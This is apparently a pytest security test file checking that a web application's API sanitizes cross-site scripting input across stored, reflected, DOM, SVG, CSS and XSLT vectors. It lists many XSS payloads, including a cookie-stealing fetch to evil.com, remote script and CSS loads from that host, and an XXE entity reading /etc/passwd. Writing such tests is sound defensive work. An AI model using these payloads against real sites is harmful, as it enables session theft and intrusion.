"""
Cross-Site Scripting (XSS) Attack Prevention Tests
==================================================

Comprehensive testing for XSS attack vectors:
- Stored XSS (Persistent XSS)
- Reflected XSS
- DOM-based XSS
- JavaScript protocol injection
- Event handler injection
- HTML attribute injection
- CSS injection
- SVG-based XSS
- XML/XSLT XSS

These tests validate that the application properly sanitizes and encodes
user inputs to prevent XSS attacks.
"""

import pytest
import re
from typing import List, Dict, Any
from unittest.mock import Mock, patch
import html
import json


class TestStoredXSS:
    """
    Stored XSS (Persistent XSS) Tests
    
    Tests XSS payloads that are stored in the database and
    executed when other users view the content.
    """
    
    def test_basic_stored_xss_in_profile(self, client, user_token):
        """Test basic stored XSS in user profile"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>"
        ]
        
        for payload in xss_payloads:
            # Store malicious content
            response = client.post('/api/v1/profile/bio',
                                  headers=headers,
                                  json={'bio': payload})
            
            assert response.status_code in [200, 201]
            
            # Retrieve and check if sanitized
            profile = client.get('/api/v1/profile', headers=headers)
            data = profile.get_json()
            bio = data.get('bio', '')
            
            # Should be sanitized (no script tags)
            assert not self._contains_executable_script(bio), \
                f"Stored XSS not sanitized: {payload}"
            
            # Should be HTML-encoded or stripped
            assert '<script>' not in bio.lower(), \
                f"Script tag not escaped: {payload}"
    
    def test_stored_xss_in_comments(self, client, user_token):
        """Test stored XSS in comments"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        xss_payloads = [
            "<script>document.cookie='stolen'</script>",
            "<img src=x onerror='fetch(\"http://evil.com?cookie=\"+document.cookie)'>",
            "<<SCRIPT>alert('XSS')//<</SCRIPT>",
            "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>"
        ]
        
        for payload in xss_payloads:
            response = client.post('/api/v1/posts/1/comments',
                                  headers=headers,
                                  json={'content': payload})
            
            # Get comments
            comments = client.get('/api/v1/posts/1/comments', headers=headers)
            data = comments.get_json()
            
            # Check all comments are sanitized
            for comment in data.get('comments', []):
                content = comment.get('content', '')
                assert not self._contains_executable_script(content), \
                    f"Comment XSS not sanitized: {payload}"
    
    def test_stored_xss_in_search_terms(self, client, user_token):
        """Test stored XSS in search history/terms"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        malicious_search = "<script>alert(document.domain)</script>"
        
        # Perform search
        client.get(f'/api/v1/search?q={malicious_search}', headers=headers)
        
        # Get search history
        history = client.get('/api/v1/search/history', headers=headers)
        data = history.get_json()
        
        for item in data.get('searches', []):
            query = item.get('query', '')
            assert '<script>' not in query.lower(), \
                "Search term XSS not sanitized"
    
    def test_stored_xss_in_rich_text_editor(self, client, user_token):
        """Test XSS in rich text content"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        rich_text_payloads = [
            "<p><script>alert('XSS')</script></p>",
            "<div onmouseover='alert(1)'>Hover me</div>",
            "<a href='javascript:alert(1)'>Click</a>",
            "<p style='background:url(javascript:alert(1))'>Test</p>"
        ]
        
        for payload in rich_text_payloads:
            response = client.post('/api/v1/posts',
                                  headers=headers,
                                  json={'content': payload, 'title': 'Test'})
            
            post_id = response.get_json().get('id')
            
            # Retrieve post
            post = client.get(f'/api/v1/posts/{post_id}', headers=headers)
            content = post.get_json().get('content', '')
            
            # Should sanitize while preserving safe HTML
            assert not self._contains_executable_script(content), \
                f"Rich text XSS not sanitized: {payload}"
    
    @staticmethod
    def _contains_executable_script(text: str) -> bool:
        """Check if text contains executable script"""
        dangerous_patterns = [
            r'<script[^>]*>',
            r'javascript:',
            r'on\w+\s*=',  # event handlers
            r'<iframe[^>]*src',
            r'<object[^>]*data',
            r'<embed[^>]*src'
        ]
        
        text_lower = text.lower()
        return any(re.search(pattern, text_lower, re.IGNORECASE) 
                  for pattern in dangerous_patterns)


class TestReflectedXSS:
    """
    Reflected XSS Tests
    
    Tests XSS payloads that are immediately reflected back to the user
    (e.g., in search results, error messages, URL parameters).
    """
    
    def test_reflected_xss_in_search(self, client, user_token):
        """Test reflected XSS in search results"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        for payload in xss_payloads:
            response = client.get(f'/api/v1/search?q={payload}', headers=headers)
            
            data = response.get_json()
            response_str = json.dumps(data)
            
            # Payload should be encoded/sanitized in response
            assert not self._contains_unescaped_html(response_str, payload), \
                f"Reflected XSS in search: {payload}"
    
    def test_reflected_xss_in_error_messages(self, client):
        """Test reflected XSS in error messages"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>"
        ]
        
        for payload in xss_payloads:
            # Try invalid endpoints with XSS
            response = client.get(f'/api/v1/invalid/{payload}')
            
            if response.status_code >= 400:
                data = response.get_json()
                error_msg = data.get('message', '') + data.get('error', '')
                
                # Error message should not contain unescaped payload
                assert '<script>' not in error_msg.lower(), \
                    f"XSS in error message: {payload}"
    
    def test_reflected_xss_in_redirect(self, client, user_token):
        """Test reflected XSS in redirect URLs"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        malicious_urls = [
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "http://evil.com/redirect?url=javascript:alert(1)"
        ]
        
        for url in malicious_urls:
            response = client.get(f'/api/v1/redirect?url={url}', 
                                headers=headers,
                                follow_redirects=False)
            
            # Should not redirect to malicious URL
            if response.status_code in [301, 302, 303, 307, 308]:
                location = response.headers.get('Location', '')
                assert not location.startswith('javascript:'), \
                    f"Malicious redirect allowed: {url}"
                assert not location.startswith('data:'), \
                    f"Data URL redirect allowed: {url}"
    
    def test_reflected_xss_in_api_response_headers(self, client, user_token):
        """Test XSS in custom response headers"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        xss_in_header = "<script>alert('XSS')</script>"
        
        response = client.get(f'/api/v1/data?custom={xss_in_header}',
                            headers=headers)
        
        # Check custom headers don't contain unescaped XSS
        for header_name, header_value in response.headers.items():
            if 'custom' in header_name.lower():
                assert '<script>' not in header_value.lower(), \
                    "XSS in custom header"
    
    @staticmethod
    def _contains_unescaped_html(text: str, payload: str) -> bool:
        """Check if text contains unescaped HTML from payload"""
        # Check if dangerous tags from payload are present unescaped
        dangerous_tags = ['<script', '<img', '<iframe', '<object', '<embed', 'javascript:']
        payload_lower = payload.lower()
        text_lower = text.lower()
        
        for tag in dangerous_tags:
            if tag in payload_lower and tag in text_lower:
                # Check if it's properly escaped
                if tag.replace('<', '&lt;') not in text:
                    return True
        return False


class TestDOMBasedXSS:
    """
    DOM-based XSS Tests
    
    Tests XSS that occurs in the DOM environment of the browser.
    """
    
    def test_dom_xss_via_location_hash(self, client):
        """Test DOM XSS via location.hash"""
        # This would typically be tested in browser tests
        # Here we test the API doesn't facilitate it
        
        response = client.get('/api/v1/page/data')
        data = response.get_json()
        
        # Check response doesn't include dangerous DOM operations
        response_str = json.dumps(data)
        
        dangerous_patterns = [
            'document.write',
            'eval(',
            'innerHTML',
            'outerHTML',
            'location.hash'
        ]
        
        for pattern in dangerous_patterns:
            assert pattern not in response_str, \
                f"Potentially dangerous DOM operation in API: {pattern}"
    
    def test_dom_xss_sink_prevention(self, client, user_token):
        """Test prevention of data reaching dangerous DOM sinks"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        # Test data that would be dangerous in DOM sinks
        dangerous_data = [
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "data:text/html,<script>alert(1)</script>"
        ]
        
        for data in dangerous_data:
            response = client.post('/api/v1/user/preferences',
                                  headers=headers,
                                  json={'homepage': data})
            
            # Get preferences
            prefs = client.get('/api/v1/user/preferences', headers=headers)
            homepage = prefs.get_json().get('homepage', '')
            
            # Should be sanitized
            assert not homepage.startswith('javascript:'), \
                "JavaScript protocol not blocked"
            assert not homepage.startswith('data:'), \
                "Data URL not blocked"


class TestJavaScriptProtocolInjection:
    """
    JavaScript Protocol Injection Tests
    
    Tests injection via javascript: protocol in URLs
    """
    
    def test_javascript_protocol_in_links(self, client, user_token):
        """Test javascript: protocol in href attributes"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        js_protocols = [
            "javascript:alert('XSS')",
            "JavaScript:void(0)",
            "  javascript:alert(1)",  # with whitespace
            "java\nscript:alert(1)",  # with newline
            "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)"  # HTML encoded
        ]
        
        for protocol in js_protocols:
            response = client.post('/api/v1/links',
                                  headers=headers,
                                  json={'url': protocol, 'title': 'Test'})
            
            link_id = response.get_json().get('id')
            
            # Retrieve link
            link = client.get(f'/api/v1/links/{link_id}', headers=headers)
            url = link.get_json().get('url', '')
            
            # JavaScript protocol should be blocked or sanitized
            assert not url.lower().strip().startswith('javascript:'), \
                f"JavaScript protocol not blocked: {protocol}"
    
    def test_data_protocol_injection(self, client, user_token):
        """Test data: protocol injection"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        data_urls = [
            "data:text/html,<script>alert('XSS')</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            "data:image/svg+xml,<svg onload=alert('XSS')>"
        ]
        
        for url in data_urls:
            response = client.post('/api/v1/images',
                                  headers=headers,
                                  json={'src': url})
            
            image_id = response.get_json().get('id')
            
            # Retrieve image
            image = client.get(f'/api/v1/images/{image_id}', headers=headers)
            src = image.get_json().get('src', '')
            
            # Data URLs with scripts should be blocked
            if 'script' in url.lower() or 'onload' in url.lower():
                assert not src.startswith('data:'), \
                    f"Malicious data URL not blocked: {url}"


class TestEventHandlerInjection:
    """
    Event Handler Injection Tests
    
    Tests injection via HTML event handlers (onclick, onerror, etc.)
    """
    
    def test_event_handler_attributes(self, client, user_token):
        """Test injection via event handler attributes"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        event_handlers = [
            "<div onclick='alert(1)'>Click</div>",
            "<img src=x onerror='alert(1)'>",
            "<body onload='alert(1)'>",
            "<svg onload='alert(1)'>",
            "<input onfocus='alert(1)' autofocus>",
            "<marquee onstart='alert(1)'>",
            "<video onloadstart='alert(1)' src=x>",
            "<audio oncanplay='alert(1)' src=x>"
        ]
        
        for payload in event_handlers:
            response = client.post('/api/v1/content',
                                  headers=headers,
                                  json={'html': payload})
            
            content_id = response.get_json().get('id')
            
            # Retrieve content
            content = client.get(f'/api/v1/content/{content_id}', headers=headers)
            html = content.get_json().get('html', '')
            
            # Event handlers should be stripped or escaped
            assert not re.search(r'on\w+\s*=', html, re.IGNORECASE), \
                f"Event handler not removed: {payload}"
    
    def test_event_handler_in_attributes(self, client, user_token):
        """Test event handlers in various HTML attributes"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        attribute_payloads = [
            {'tag': 'img', 'attr': 'src', 'value': 'x onerror=alert(1)'},
            {'tag': 'a', 'attr': 'href', 'value': '#" onclick="alert(1)'},
            {'tag': 'input', 'attr': 'value', 'value': 'x" onfocus="alert(1)'}
        ]
        
        for payload in attribute_payloads:
            response = client.post('/api/v1/html/element',
                                  headers=headers,
                                  json=payload)
            
            element = response.get_json().get('html', '')
            
            # Event handlers should not be present
            assert 'onerror=' not in element.lower(), \
                "onerror handler not sanitized"
            assert 'onclick=' not in element.lower(), \
                "onclick handler not sanitized"
            assert 'onfocus=' not in element.lower(), \
                "onfocus handler not sanitized"


class TestHTMLAttributeInjection:
    """
    HTML Attribute Injection Tests
    
    Tests injection via breaking out of HTML attributes
    """
    
    def test_attribute_breakout(self, client, user_token):
        """Test breaking out of HTML attributes"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        breakout_payloads = [
            '" onclick="alert(1)"',
            "' onmouseover='alert(1)'",
            '"><script>alert(1)</script>',
            "'><img src=x onerror=alert(1)>",
            '"/><script>alert(1)</script><input"'
        ]
        
        for payload in breakout_payloads:
            response = client.post('/api/v1/profile/name',
                                  headers=headers,
                                  json={'name': payload})
            
            # Get profile
            profile = client.get('/api/v1/profile', headers=headers)
            name = profile.get_json().get('name', '')
            
            # Should be properly encoded
            assert '"' not in name or '&quot;' in name or '\\"' in name, \
                f"Quote not escaped: {payload}"
            assert '<script>' not in name.lower(), \
                f"Script tag in attribute: {payload}"
    
    def test_attribute_injection_in_json(self, client, user_token):
        """Test attribute injection in JSON responses"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        json_payloads = [
            '{"name": "<script>alert(1)</script>"}',
            '{"bio": "\"><img src=x onerror=alert(1)>"}'
        ]
        
        for payload in json_payloads:
            response = client.post('/api/v1/profile/update',
                                  headers=headers,
                                  data=payload,
                                  content_type='application/json')
            
            # Get updated profile
            profile = client.get('/api/v1/profile', headers=headers)
            data = profile.get_json()
            
            # Check all fields are sanitized
            for value in data.values():
                if isinstance(value, str):
                    assert '<script>' not in value.lower(), \
                        "Script tag in JSON response"


class TestCSSInjection:
    """
    CSS Injection Tests
    
    Tests XSS via CSS (less common but still dangerous)
    """
    
    def test_css_expression_injection(self, client, user_token):
        """Test CSS expression() injection (IE)"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        css_payloads = [
            "width: expression(alert('XSS'))",
            "background: url('javascript:alert(1)')",
            "background: url(\"javascript:alert(1)\")",
            "-moz-binding: url('http://evil.com/xss.xml#xss')"
        ]
        
        for payload in css_payloads:
            response = client.post('/api/v1/profile/style',
                                  headers=headers,
                                  json={'custom_css': payload})
            
            # Get profile
            profile = client.get('/api/v1/profile', headers=headers)
            css = profile.get_json().get('custom_css', '')
            
            # Should block dangerous CSS
            assert 'expression(' not in css.lower(), \
                f"CSS expression not blocked: {payload}"
            assert 'javascript:' not in css.lower(), \
                f"JavaScript in CSS URL not blocked: {payload}"
    
    def test_css_import_injection(self, client, user_token):
        """Test CSS @import injection"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        import_payloads = [
            "@import 'http://evil.com/steal.css';",
            "@import url('javascript:alert(1)');",
        ]
        
        for payload in import_payloads:
            response = client.post('/api/v1/theme/css',
                                  headers=headers,
                                  json={'css': payload})
            
            # CSS with @import should be rejected or sanitized
            assert response.status_code in [400, 422], \
                f"CSS @import not blocked: {payload}"


class TestSVGBasedXSS:
    """
    SVG-based XSS Tests
    
    Tests XSS via SVG elements and files
    """
    
    def test_svg_onload_xss(self, client, user_token):
        """Test SVG onload XSS"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        svg_payloads = [
            "<svg onload=alert('XSS')>",
            "<svg><script>alert('XSS')</script></svg>",
            "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
            "<svg><set onbegin=alert('XSS') attributeName=x to=0>"
        ]
        
        for payload in svg_payloads:
            response = client.post('/api/v1/images/svg',
                                  headers=headers,
                                  json={'svg': payload})
            
            if response.status_code in [200, 201]:
                image = client.get('/api/v1/images/svg/latest', headers=headers)
                svg = image.get_json().get('svg', '')
                
                # Should sanitize SVG
                assert 'onload=' not in svg.lower(), \
                    f"SVG onload not sanitized: {payload}"
                assert '<script>' not in svg.lower(), \
                    f"Script in SVG not removed: {payload}"
    
    def test_svg_file_upload_xss(self, client, user_token):
        """Test XSS via SVG file upload"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        malicious_svg = b'''<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
    <script>alert('XSS')</script>
</svg>'''
        
        response = client.post('/api/v1/files/upload',
                              headers=headers,
                              data={'file': (malicious_svg, 'image.svg', 'image/svg+xml')})
        
        if response.status_code in [200, 201]:
            file_id = response.get_json().get('id')
            
            # Download and check file
            file_response = client.get(f'/api/v1/files/{file_id}', headers=headers)
            
            # Should have sanitized or rejected
            content = file_response.data.decode('utf-8')
            assert '<script>' not in content.lower(), \
                "Script in SVG file not removed"


class TestXMLXSLTInjection:
    """
    XML/XSLT XSS Tests
    
    Tests XSS via XML and XSLT transformations
    """
    
    def test_xslt_script_injection(self, client, user_token):
        """Test script injection in XSLT"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        xslt_payload = '''<?xml version="1.0"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <script>alert('XSS')</script>
    </xsl:template>
</xsl:stylesheet>'''
        
        response = client.post('/api/v1/transform/xslt',
                              headers=headers,
                              json={'xslt': xslt_payload})
        
        # Should reject or sanitize XSLT with scripts
        assert response.status_code in [400, 422], \
            "XSLT script injection not blocked"
    
    def test_xml_external_entity_with_xss(self, client, user_token):
        """Test XXE combined with XSS"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        xxe_xss = '''<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;<script>alert('XSS')</script></data>'''
        
        response = client.post('/api/v1/xml/parse',
                              headers=headers,
                              data=xxe_xss,
                              content_type='application/xml')
        
        # Should block XXE and XSS
        assert response.status_code in [400, 422], \
            "XXE with XSS not blocked"


# Fixtures

@pytest.fixture
def client():
    """Create test client"""
    from samplemind.app import create_app
    app = create_app('testing')
    return app.test_client()


@pytest.fixture
def user_token():
    """Create JWT token for regular user"""
    from samplemind.auth.jwt import create_access_token
    return create_access_token({'user_id': 1, 'role': 'user'})


if __name__ == '__main__':
    pytest.main([__file__, '-v'])